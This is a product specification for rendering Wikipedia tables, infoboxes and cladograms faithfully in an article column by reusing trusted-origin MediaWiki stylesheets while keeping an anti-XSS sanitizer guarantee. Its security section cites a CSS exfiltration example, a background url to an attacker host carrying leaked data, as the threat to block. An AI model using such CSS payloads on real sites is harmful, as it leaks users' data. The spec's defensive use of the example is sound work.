# Spec — Wikipedia style reuse for faithful article tables & infoboxes

**Status:** Ready for UX + Dev. **Owner:** Product. **Area:** Article rendering (the "Wiki" left column).
**Supersedes the strategy of:** the bespoke structure-keyed table/infobox CSS (`app/globals.css` Group B)
and the #74 "structure-keyed CSS, accept the losses" decision — for tables and infoboxes specifically.

## 1. Problem

The article column re-derives Wikipedia's table and infobox layout by hand, in bespoke CSS keyed off
the Parsoid classes and element structure that survive sanitize (`app/globals.css` §"Group B"; the #74
decision in `docs/ARCHITECTURE.md` "DOMPurify allowlist" entry). The sanitizer strips **all** of
Wikipedia's own styling for XSS safety — every inline `style` attribute, every `<style>` block, and every
TemplateStyles module — and we then hand-approximate each box's shape. This works for a handful of common
box shapes (the modern infobox, the taxobox, a plain data table) but does not scale: each new table type
on each new article is a fresh reverse-engineering job. The owner names this correctly as a yak shave.

The seeded **Cat** article (https://wikiplus.wikiedu.org/topic/Cat/) is the concrete failure case. Fetched
from live Parsoid, it contains:

- **112 `<table>` elements**, dominated by structures our bespoke CSS never modeled:
  - **16 `class="clade"` cladograms** — phylogenetic trees drawn *entirely* by `Template:Clade/styles.css`
    (TemplateStyles) plus per-cell inline `border`/`padding` that paint the tree branches. Strip that CSS
    and the trees collapse into nested borderless tables: visually broken, semantically unreadable.
  - **~90 navbox tables** (`navbox-subgroup`, `navbox-inner`, `mw-collapsible`, `hlist`) — the bottom-of-
    article navigation complex. (Note: navboxes are already in the `stripChrome` removal list, so they
    should not render at all; if any leak through they render as raw broken tables. The strip behavior is
    out of scope to change here — see §4 — but verify they stay stripped.)
  - **1 `infobox biota`** (the taxobox — "Felis catus" scientific classification) and **1 `infobox`**.
  - **2 `gallery-element`** image-gallery tables.
- **21 distinct TemplateStyles modules** and **942 inline `style=` attributes** — i.e. essentially all of
  the article's visual layout — that the sanitizer removes before we ever see the DOM.

So on Cat, our hand-rolled CSS faithfully reaches at most the two infoboxes and plain data tables; the
cladograms (the article's signature visual) and any galleries render badly, and there is no bespoke rule
that will ever catch the long tail without writing one per template family. The root cause is structural:
**we discard Wikipedia's own stylesheets and then try to recreate them.**

## 2. User value & personas served

- **The Curious Reader** (UX persona: arrives to actually read the encyclopedia next to the clips) gets a
  Wikipedia article that *looks like Wikipedia* — including its taxonomy trees, its scientific-classification
  box, and its data tables — instead of a column of broken table fragments that undermines trust in the whole
  page. The CLAUDE.md principle "the Wiki article side keeps a faithful Wikipedia look" is the product promise
  this redeems.
- **The wiki+ team / future contributors** stop paying the per-template-family tax. Faithful rendering of an
  arbitrary article stops requiring a bespoke CSS authoring pass, which is the only way article coverage
  scales beyond a hand-curated set of seeded science topics.

## 3. Scope

**In scope (the article column's tables & infoboxes):**

1. Adopt a **systematic** styling strategy that reuses Wikipedia's / MediaWiki's *own* layout rules for
   the article body, scoped under `.wiki-body`, rather than (or in addition to) the bespoke hand-rolled
   approximations — see the §4 decision step for the constraint that bounds *which* styles and from *where*.
2. As the success bar, faithful rendering on the **Cat** page of: the taxobox (`infobox biota`), the plain
   modern infobox, the **cladogram** tables (`class="clade"`), and ordinary data tables — including the
   taxon-band color and per-cell shading that the #74 decision explicitly gave up.
3. Keep the existing **responsive** behavior: the infobox/taxobox stacks full-width below `lg`; wide tables
   remain horizontally scrollable within a contained region (never widening the two-column shell).
4. Retire or supersede the bespoke Group-B table/infobox CSS to the extent the systematic approach replaces
   it, so we are not maintaining two overlapping styling systems (Dev's call on the exact cutover).

**Out of scope (do not touch):**

- The **＋plus rail** and any Indigo Press component — this work is entirely the left article column.
- The article **reading layout / two-world split / header / scroll-sync / TOC / citation popover** — those
  ship and stay as-is.
- The **strip list** (`stripChrome`): what we *remove* from the article (editor chrome, navboxes, ambox/
  metadata, sidebars) is a Curation/editorial decision and is not being reopened here. This spec changes how
  surviving tables are *styled*, not which elements survive. (Navbox tables should remain stripped; this spec
  only asks QA to confirm that, not to restyle them.)
- **Math** rendering (the SVG-fallback-image mechanism, C4) — unaffected; leave it.
- **Multilingual / non-English** articles — English Wikipedia only, consistent with MVP.
- Re-opening the article column to host video or any in-article wiki+ chrome.

## 4. Decision / discovery step the build requires (with the hard security constraint)

This spec sets *what* and *why*; the *how* is Dev's, made in the design/discovery step below and recorded in
the build's `docs/specs`/`docs/design` artifacts. **The following constraint is non-negotiable and frames
the decision — it is not Dev's to trade away:**

### Hard requirement — the X4 anti-XSS guarantee must survive

The current sanitizer (`lib/wiki/article.ts`) strips **all** inline `style` attributes, all `<style>`
blocks, and all TemplateStyles/`<link>` from the *untrusted article HTML*, and that protection (the "X4"
guarantee, asserted by `test/article.test.ts` + `test/article-fidelity.test.ts`) **must continue to hold**.
The threat is real: arbitrary attacker-controlled CSS embedded in page HTML enables data exfiltration via
`background:url(attacker.example/?leak=…)`, can break or overlay the page layout, and is a deliberate part
of the attack surface this product strips. **The build MUST NOT solve this by trusting `style` attributes
or `<style>` blocks that arrive inside the fetched article body.** Any solution that re-permits page-embedded
inline/`<style>` CSS without an independent, reviewed proof of X4 is rejected at QA.

### The decision space (Dev picks the mechanism; the spec rules out the unsafe ones)

The legitimate way to "reuse Wikipedia's styles systematically" is to load **Wikipedia's / MediaWiki's own
known stylesheets** — the core content/skin styles plus the page's TemplateStyles modules — from the
**trusted `en.wikipedia.org` / MediaWiki origin** (not from the page body's own embedded CSS), scope every
rule under `.wiki-body`, and apply them to the sanitized DOM. The discovery step must determine and record:

- **Which** stylesheet(s) reproduce the needed shapes — at minimum the content/`Template:Clade/styles.css`
  family and the infobox/taxobox TemplateStyles modules referenced by the page — and how to obtain them from
  the trusted origin (e.g. the ResourceLoader / TemplateStyles endpoints) rather than from the stripped body.
- **How they are scoped and neutered** so that (a) every selector is confined under `.wiki-body` and cannot
  affect wiki+ chrome, and (b) the loaded CSS itself cannot become an exfiltration/overlay vector — e.g.
  the reused CSS must be Wikipedia's own (trusted-origin) rules, not arbitrary page CSS, and any `url()` /
  positioning it carries must be evaluated for the same X4 threat (a trusted-origin stylesheet is the bar;
  if a reuse path still admits attacker-influenced values it does not meet X4 and is rejected).
- **The cutover**: which bespoke Group-B rules the reused CSS replaces vs. which thin wiki+ overrides remain
  (e.g. the rules that keep the box's frame faithful-grey and prevent Indigo bleed).

This is a genuine fork in strategy. Product's steer: the **trusted-origin-stylesheet reuse** path is the
intended direction; chasing per-template bespoke CSS is the anti-pattern we are leaving. But Product does
not prescribe the loading mechanism, the caching, or the exact selector-scoping — Dev resolves those in the
discovery step and records the chosen mechanism + its X4 argument in the build artifact for QA to verify.

## 5. Acceptance criteria (testable; QA verifies each)

1. **AC1 — Faithful taxobox.** On the Cat Topic page, the `infobox biota` (scientific-classification box)
   renders with its real layout: centered bold banner rows, the left-aligned taxon-rank key/value ladder,
   the lead image centered, and the **taxon-band color** present (the green/animal band the #74 decision had
   given up). It floats right at `≥ lg`.
2. **AC2 — Faithful plain infobox.** Any plain `class="infobox"` on Cat renders with faithful Wikipedia
   infobox layout (banner, key/value rows, image), with the faithful grey frame.
3. **AC3 — Faithful cladograms.** The `class="clade"` cladogram tables on Cat render as legible
   phylogenetic trees — branch lines and indentation present, matching Wikipedia's tree shape — not as
   collapsed/borderless nested tables. (This is the headline fix; if cladograms are not legible, AC3 fails.)
4. **AC4 — Faithful data tables.** Ordinary data tables on Cat render with Wikipedia's header shading,
   borders, and alignment; wide tables remain horizontally scrollable within a contained region and never
   widen the two-column shell.
5. **AC5 — X4 still holds (non-negotiable).** The existing XSS regression tests
   (`test/article.test.ts`, `test/article-fidelity.test.ts`, the X4 assertions) still pass unchanged in
   intent: no `<script>`, no inline event handlers, no `javascript:`/`data:text/html` URIs, and **no
   page-body-embedded `style`/`<style>`/TemplateStyles is trusted**. QA confirms a crafted article body
   carrying a malicious `style`/`<style>` payload still has that payload neutralized (the reused CSS comes
   only from the trusted MediaWiki origin, scoped under `.wiki-body`). A new regression test asserting the
   chosen reuse path does not admit page-body CSS is added if the mechanism warrants one.
6. **AC6 — No Indigo Press bleed.** No reused or wiki+ rule introduces Indigo Press color/treatment into the
   article column. The box frame stays faithful Wikipedia grey; the article column keeps its Wikipedia look;
   the ＋plus rail is visually unchanged. Verified by UX evaluation against the design contract.
7. **AC7 — AA accessibility.** All restyled tables/infoboxes meet AA: text/background contrast ≥ 4.5:1 for
   body text and ≥ 3:1 for large text and meaningful UI boundaries; no information conveyed by color alone
   (banners keep their structural signal — position, weight, hairline, heading text — independent of the
   band color); keyboard scroll of wide-table regions still works; images keep their `alt`.
8. **AC8 — Responsive.** Below `lg`, the infobox and taxobox stack full-width (no unreadable narrow float),
   and cladograms/data tables either scroll horizontally within their contained region or reflow without
   widening the shell. Verified at a narrow and a wide viewport.
9. **AC9 — No regression elsewhere.** Math (SVG fallback), citations popover, scroll-sync, TOC, wikilink
   routing, and section anchors on Cat and on the previously-verified articles (`Photosynthesis`,
   `Cellular_respiration`, `Lion`, `Pythagorean_theorem`) still behave as before. `yarn build` and the full
   test suite pass.

## 6. Success metric

- **Primary (faithfulness coverage):** On a sample set of articles spanning the hard table families
  — Cat (cladograms + taxobox), Lion (taxobox), San Francisco (modern settlement infobox), and one
  data-table-heavy article — the count of **broken table/infobox elements** (collapsed, unstyled, or
  visually garbled vs. Wikipedia) drops to **zero** for the in-scope families, and a side-by-side with the
  same article on en.wikipedia.org reads as the same layout (allowing for the column width and the stripped
  editor chrome/navboxes). The bar is "a reader could not tell our taxobox/cladogram/table from
  Wikipedia's, modulo width."
- **Secondary (yak-shave eliminated):** Adding faithful rendering for a *new* article's tables requires
  **no new bespoke per-template CSS** — the systematic reuse covers it. Measured by: render a held-out
  article not used during the build (e.g. a different taxon or a statistics-table article) and confirm its
  in-scope tables render faithfully with zero new rules added.

## 7. Assumptions (this run had no groomed issue — recorded for refinement)

- **A1.** This autonomous build-loop run was triggered from owner intent (the verbatim steer about Cat-page
  table fidelity), not from a groomed `type: build` + `status: ready` GitHub Issue. Scope here is Product's
  reasonable read of that intent; a future grooming pass may narrow it (e.g. cladograms only vs. all tables).
- **A2.** Wikipedia's / MediaWiki's own stylesheets (core content styles + the page's TemplateStyles modules)
  are obtainable from the trusted `en.wikipedia.org` / MediaWiki origin in a form that can be scoped under
  `.wiki-body`. If the discovery step finds no safe trusted-origin reuse path that meets X4, the fallback is
  to *extend* the bespoke approach to cover cladograms specifically (the headline breakage) and flag the rest
  for a follow-up — but the trusted-origin path is strongly preferred and should be the first attempt.
- **A3.** Navbox tables remain stripped (not restyled) per the current `stripChrome` behavior; this spec does
  not reopen the strip list. If the owner later wants navboxes shown, that is a separate Curation + Product
  decision.
- **A4.** "Faithful taxon-band color" (AC1) is now in scope precisely because the systematic reuse path is
  expected to recover the per-taxon `<style>`/TemplateStyles color that #74 deliberately gave up. If the
  chosen safe mechanism cannot recover per-taxon color without violating X4, AC1's color clause degrades to
  the #74 neutral-grey band as an accepted partial — but the structural faithfulness (AC1 minus color) and
  the cladograms (AC3) remain hard requirements.

---

### Hand-off

- **UX / Design** — produce the design contract for the restyled article tables/infoboxes: the faithful-
  Wikipedia visual target for taxobox, plain infobox, cladogram, and data table in the article column; the
  responsive stacking/scroll behavior; the AA contrast + no-color-alone treatment; and the explicit "no
  Indigo bleed" boundary. This contract is the input to Dev and the bar for the post-build UX evaluation.
- **Development** — run the §4 discovery step first (pick the safe trusted-origin style-reuse mechanism,
  record it + its X4 argument), then implement against the UX contract and these acceptance criteria. Retire
  the superseded Group-B bespoke CSS as the reuse path replaces it. The X4 guarantee (AC5) is a release gate.
- **QA & Review** — verify each AC, with AC5 (X4) as a hard, non-author security review, and confirm no
  regression on the previously-verified articles (AC9).
